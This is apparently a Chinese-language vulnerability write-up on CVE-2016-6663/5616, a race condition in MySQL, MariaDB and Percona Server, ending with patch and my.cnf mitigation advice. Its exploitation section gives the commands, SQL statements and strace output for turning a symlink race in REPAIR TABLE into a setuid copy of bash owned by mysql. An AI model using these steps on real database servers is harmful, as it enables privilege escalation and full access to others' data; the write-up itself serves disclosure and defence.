0x00 综述


MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可 MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。

Percona Server为 MySQL 数据库服务器进行了改进，在功能和性能上较 MySQL 有着很显著的提升。该版本提升了在高负载情况下的 InnoDB 的性能、为 DBA 提供一些非常有用的性能诊断工具；另外有更多的参数和命令来控制服务器行为。

Dawid Golunski在 MySQl,MariaDB 和 PerconaDB 数据库中发现条件竞争漏洞，拥有低权限(CREATE/INSERT/SELECT权限)账号攻击者可以利用多个漏洞最终获取操作系统root权限。

0x03 漏洞描述


Dawid Golunski在 MySQl, MariaDB 和 PerconaDB 数据库中发现条件竞争漏洞，拥有低权限(CREATE/INSERT/SELECT权限)账号攻击者可以利用漏洞（CVE-2016-6663）提升权限到数据库系统用户（通常是'mysql'）执行任意代码。攻击者拥有数据库系统用户权限可被允许完全访问数据库。攻击者也可通过(CVE-2016-6662 和CVE-2016-6664漏洞)获取操作系统root权限。


0x04 漏洞利用


CVE-2016-6663／5616漏洞利用过程思路比较有趣，详细利用过程如下：


1）  使用attacker用户（普通系统用户）先在/tmp/下创建一个临时目录/tmp/disktable，并将权限修改为777，如下所示：

attacker@debian:~$mkdir /tmp/disktable

attacker@debian:~$chmod 777 /tmp/disktable/

attacker@debian:~$ls -ld /tmp/disktable/

drwxrwxrwx2 attacker attacker 4096 Oct 28 10:53 /tmp/disktable/

2）然后使用拥有创建表（CREATE）权限的mysql数据库用户可以登录数据库执行创建表操作并通过DATA DIRECTORY指定磁盘目录：

mysql>CREATE TABLE poctab1 (txt varchar(50)) engine = 'MyISAM' data directory'/tmp/disktable';

然后mysql就会在下面的目录创建一个表，如下所示：

attacker@debian:~$ls -l /tmp/disktable/

total0

-rw-rw----1 mysql mysql 0 Oct 28 10:53 poctab1.MYD

 

如果开启了SELINUX，默认情况下会创建失败，如下图所示：

mysql>CREATE TABLE poctab1 (txt varchar(50)) engine = 'MyISAM' data directory'/tmp/disktable';

ERROR1 (HY000): Can't create/write to file '/tmp/disktable/poctab1.MYD' (Errcode:13)

3）执行修复操作

mysql>REPAIR TABLE `poctab1`;

+----------------+--------+----------+----------+

|Table          | Op     | Msg_type | Msg_text |

+----------------+--------+----------+----------+

|testdb.poctab1 | repair | status   |OK       |

在第一个系统调用中：

[pid  1463]lstat("/tmp/disktable/poctab1.MYD", {st_mode=S_IFREG|0660, st_size=0,...}) = 0

会来检查poctab1.MYD的文件本身的权限，然后在创建修复表时，会复制该文件的权限，因此在

[pid  1463]lstat("/tmp/disktable/poctab1.MYD", {st_mode=S_IFREG|0660, st_size=0,...}) = 0

和

[pid  1463]chmod("/tmp/disktable/poctab1.TMD", 0660) = 0

之间存在竞争关系。

如果攻击者删除临时表poctab1.TMD，然后通过软链接在chmod()操作前将poctab1.TMD替换为/var/lib/mysql的软链接，那么就可以完全控制MYSQLdata目录的权限。


2）攻击者可以先将poctab1.MYD的权限改为04777（suid），然后通过在chmod()的调用过程之前复制一个bash文件来获取执行权限从而执行命令。

但是这里有一个问题，suid shell只能被所属的用户或组保留，因此攻击者复制过去的bash是攻击者自己的suid，没有办法直接完成该操作。

此处可以通过新建一个groupsticky bit的目录来绕过这个限制。

attacker@debian:/tmp/disktable$chmod g+s/tmp/disktable/

attacker@debian:/tmp/disktable$ls -ld /tmp/disktable/

drwxrwsrwx 2 attacker attacker 4096 Oct 2811:25 /tmp/disktable/

然后执行创建表操作：

mysql>CREATE TABLE poctab2 (txt varchar(50)) engine = 'MyISAM' data directory'/tmp/disktable';

QueryOK, 0 rows affected (0.00 sec)

查看所属用户

attacker@debian:/tmp/disktable$ls -l /tmp/disktable/

total0

-rw-rw----1 mysql mysql    0 Oct 28 11:04poctab1.MYD

-rw-rw---- 1 mysql attacker 0 Oct 28 11:34poctab2.MYD

由于有了group sticky bit（g+s）权限，poctab2.MYD的所属用户为mysql，但是所属组为attacker。
这样攻击者就可以复制/bin/bash到poctab2.MYD并且保留文件所属者权限。


最后，使用竞争条件就可以将poctab2.MYD增加s权限提权为mysql用户。利用过程中，是在poctab1.TMD创建的瞬间，使用inotify获得文件创建通知，之后将poctab1.TMD删除并做成指向poctab2.MYD的软链接，然后mysql会执行chmod()，之后就将poctab1.TMD指向的文件的权限改为与poctab1.MYD相同的权限，如果之前已经将poctab1.MYD设置了s权限，那么poctab2.MYD就获取了s权限。由于之前已经将/bin/bash复制到了poctab2.MYD，所以poctab2.MYD实际上是一个拥有s权限，所属者为mysql的bash文件，此时执行poctab2.MYD即可获取mysql系统用户权限。

漏洞利用如下：


最后从一个attacker用户提升到了mysql用户权限，之后就可以对mysql的文件进行任意的读写操作，之后就可以结合其他漏洞继续进行下一轮的权限提升操作了。


2）通过升级mysql版本修复漏洞以后当用户执行REPAIR TABLE `poctab1`但是表文件所属者不是mysql的系统用户时，会报告文件不存在。



0x05 修复建议


1) 安装官方补丁

2) 临时解决方案：针对CVE-2016-6663/5616的利用方法，可关闭数据库服务器配置中的符号链接支持（在my.cnf中设置symbolic-links = 0）
